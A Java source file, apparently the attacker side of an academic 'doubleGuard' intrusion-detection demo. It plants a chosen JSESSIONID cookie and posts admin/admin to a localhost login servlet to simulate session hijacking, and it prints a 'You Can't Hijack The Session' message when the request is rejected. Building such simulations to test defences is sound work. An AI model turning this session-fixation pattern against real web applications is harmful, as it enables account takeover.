/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package attacker;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.CookieStore;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.protocol.ClientContext;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.cookie.BasicClientCookie;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.params.HttpParams;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;
import org.apache.http.util.EntityUtils;

import com.util.Constants;

/**
 *
 * @author swapper
 */
public class HijackFutureSession {

	private static final String URL = "http://localhost:8080/doubleGuard/UserLogin";
	public static String getInfo(String id) {
		String res = "";
		System.out.println(id + " : " + Constants.sesWeb.get(id));
		try {
			HttpPost request = new HttpPost(URL);
			System.out.println("Creating HTTP Request For... " + URL);
			HttpContext HTTP_CONTEXT = new BasicHttpContext();
			HTTP_CONTEXT
					.setAttribute(
							CoreProtocolPNames.USER_AGENT,
							"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13");
			request.setHeader("Referer", "http://www.google.com");
			request.setHeader(
					"User-Agent",
					"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13");
			CookieStore cookieStore = new BasicCookieStore();
			BasicClientCookie cookie = new BasicClientCookie("JSESSIONID", id);
			cookie.setPath("/");
			cookie.setDomain("localhost");
			System.out.println("Setting Cookie for JSessionId : " + id);
			cookieStore.addCookie(cookie);

			
			List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
			urlParameters.add(new BasicNameValuePair("name_", "admin"));
			urlParameters.add(new BasicNameValuePair("password", "admin"));
	 
			request.setEntity(new UrlEncodedFormEntity(urlParameters));
			
			
			
			DefaultHttpClient httpClient = new DefaultHttpClient();
			System.out.println("Executing Request.....");
			httpClient.setCookieStore(cookieStore);
			
			HttpResponse response = httpClient.execute(request, HTTP_CONTEXT);

			System.out.println(response);
			
			List<Header> headers = Arrays.asList(response.getAllHeaders());
			for (Header header : headers) {
				System.out.println(header.getName());
				if ("location".equalsIgnoreCase(header.getName().toLowerCase())) {
					res = header.getValue();
					System.err.println(res);
				}
			}
			if (response.getStatusLine().getStatusCode() < 200
					|| response.getStatusLine().getStatusCode() >= 400) {
				throw new IOException("Got bad response, error code = "
						+ response.getStatusLine().getStatusCode());
			}

			HttpEntity entity = response.getEntity();
			if (entity != null) {
				System.out.println(EntityUtils.toString(entity));
				EntityUtils.consume(entity);
			}
		} catch (Exception e) {
			res = "Request Invalidated At Mapping Model.You Can't Hijack The Session";
			System.err.println(e.getCause().getLocalizedMessage());
		}
		return res;
	}
}
